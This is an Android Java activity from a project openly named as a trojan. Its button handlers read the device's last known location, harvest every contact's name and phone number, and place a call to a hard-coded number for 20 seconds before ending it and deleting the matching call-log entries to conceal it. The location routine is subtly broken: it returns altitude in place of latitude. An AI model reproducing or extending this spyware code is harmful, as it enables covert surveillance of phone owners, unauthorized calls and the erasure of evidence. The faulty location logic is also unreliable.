package trojan.android.android_trojan;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.ArrayList;

/**
 * Created by Jean-Laurent on 26/11/2014.
 */
public class second_activity extends Activity {
    private static final String TAG = "second_activity";
    private Button button21;
    private Button button22;
    private Button button23;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);
        button21 = (Button) findViewById(R.id.button21);
        button22 = (Button) findViewById(R.id.button22);
        button23 = (Button) findViewById(R.id.button23);
        button21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GetLocation();
            }
        });

        button22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Contacts();
            }
        });

        button23.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Call("0628470850", 20000);
            }
        });

    }

    public double[] GetLocation(){
        //Get location manager
        LocationManager locManager = (LocationManager)getSystemService(LOCATION_SERVICE);
        //get the best provider to obtain the current location
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        double[] result = new double[2];

        //try to get latitude and longitude
        try{
            result[0] = location.getAltitude();
            result[1] = location.getLongitude();
        }catch (Exception ex){//if this failed the method return 0,0
            Log.d(TAG, ex.getMessage());
            result[0] = 0;
            result[1] = 0;
        }
        return result;
    }


    public ArrayList Contacts(){
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(new String[]{name, phoneNo});
                    }
                    pCur.close();
                }
            }
        }
        return contacts;
    }

    public void Call(String num, long time){
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:"+num));
        startActivity(intent);
        Log.d(TAG, "Start call");
        PhoneStateReceiver test = new PhoneStateReceiver();
        Tools.sleep(time);
        test.onReceive(this.getApplicationContext(), intent);
        test.killCall(this.getApplicationContext());
        Log.d(TAG, "Stop call");

        try {
            String strNumberOne[] = { num };
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
            boolean bol = cursor.moveToFirst();
            if (bol) {
                do {
                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    getContentResolver().delete(Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(idOfRowToDelete)), "", null);
                } while (cursor.moveToNext());
            }
        } catch (Exception ex) {
            System.out.print("Exception here ");
        }
    }
}
